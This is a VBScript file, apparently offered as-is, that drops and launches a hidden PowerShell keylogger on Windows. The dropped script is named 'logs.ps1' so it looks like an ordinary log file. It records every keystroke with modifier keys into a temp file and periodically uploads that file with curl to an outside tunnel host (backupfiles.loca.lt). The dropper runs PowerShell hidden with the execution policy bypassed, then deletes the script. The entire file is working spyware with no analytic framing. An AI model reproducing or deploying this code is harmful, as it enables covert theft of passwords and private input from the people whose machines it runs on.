Set objShell = CreateObject("WScript.Shell")
pcName = LCase(Right(objShell.ExpandEnvironmentStrings( "%computername%" ), 2))
path = objShell.ExpandEnvironmentStrings("%temp%") & "\logs.ps1"

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objFile = objFSO.CreateTextFile(path, True)

s = "$sg = @'" & _
vbcrlf & "[DllImport(""user32.dll"", CharSet=CharSet.Auto, ExactSpelling=true)]" & _
vbcrlf & "public static extern short GetAsyncKeyState(int virtualKeyCode);" & _
vbcrlf & "'@" & _
vbcrlf & "$s = Add-Type -MemberDefinition $sg -Name 'Win32' -Namespace API -PassThru" & _
vbcrlf & "$sc = 0x10" & _
vbcrlf & "$_sc = 0xA0" & _
vbcrlf & "$cc = 0x11" & _
vbcrlf & "$_cc = 0xA2" & _
vbcrlf & "$ac = 0x12" & _
vbcrlf & "$_ac = 0xA4" & _
vbcrlf & "$_rac = 0xA5" & _
vbcrlf & "$i = 0" & _
vbcrlf & "$li = 90000" & _
vbcrlf & "try" & _
vbcrlf & "{" & _
vbcrlf & "  $sp = "".""" & _
vbcrlf & "  while(1)" & _
vbcrlf & "  {" & _
vbcrlf & "    Start-Sleep -Milliseconds 0x14" & _
vbcrlf & "    for ($l = 0x8; $l -le 0xFE; $l++)" & _
vbcrlf & "    {" & _
vbcrlf & "      $state = $s::GetAsyncKeyState($l)" & _
vbcrlf & "      if ($state -eq -32767)" & _
vbcrlf & "      {" & _
vbcrlf & "        if ($l -eq $cc -or $l -eq $_cc -or $l -eq $sc -or $l -eq $_sc -or $l -eq $ac -or $l -eq $_ac -or $l -eq $_rac){continue}" & _
vbcrlf & "        $p = """"" & _
vbcrlf & "        $hc = $s::GetAsyncKeyState($cc)" & _
vbcrlf & "        $ha = $s::GetAsyncKeyState($ac)" & _
vbcrlf & "        $hs = $s::GetAsyncKeyState($sc)" & _
vbcrlf & "        if ($hc -lt 0){$p+=""c""}" & _
vbcrlf & "        if ($ha -lt 0){$p+=""a""}" & _
vbcrlf & "        if ($hs -lt 0){$p+=""s""}" & _
vbcrlf & "        [System.IO.File]::AppendAllText(""$env:temp\" & pcName & "kcache.tmp"",$p+$l[0].ToString()+$sp,[System.Text.Encoding]::Unicode)" & _
vbcrlf & "      }" & _
vbcrlf & "    }" & _
vbcrlf & "    $i+=1" & _
vbcrlf & "    if ($i -gt $li) {" & _
vbcrlf & "        CMD /c 'curl -X POST -F ""file=@%temp%\" & pcName & "kcache.tmp"" https://backupfiles.loca.lt'" & _
vbcrlf & "        $i=0" & _
vbcrlf & "    }" & _
vbcrlf & "  }" & _
vbcrlf & "}" & _
vbcrlf & "finally{}"



objFile.Write(s)

objFile.Close

Set objShell = CreateObject("WScript.Shell")
objShell.Run "CMD /C START /B " & objShell.ExpandEnvironmentStrings("%SystemRoot%") & "\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -file " & path, 0, False
Set objShell = Nothing

WScript.Sleep 600

objFSO.DeleteFile path
